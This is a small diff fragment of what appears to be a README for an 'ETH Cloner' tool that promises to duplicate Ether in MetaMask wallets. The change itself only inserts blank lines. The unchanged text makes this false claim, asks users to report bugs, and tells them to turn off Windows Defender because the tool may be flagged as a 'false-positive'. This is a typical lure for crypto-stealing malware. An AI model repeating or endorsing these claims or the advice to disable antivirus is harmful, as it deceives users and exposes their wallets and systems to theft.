@@ -9,6 +9,9 @@ ETH Cloner, Duplicate your ETH on MetaMask NOW!
 💥 Warning! If you dont have ANY coins, it will not work.
 
 *If you will find any bugs/glitches, write to me!*
+
+
+
 <>
 *Windows can detect it as a false-positive, if menu is not loading up, turn Defender off*
 <>
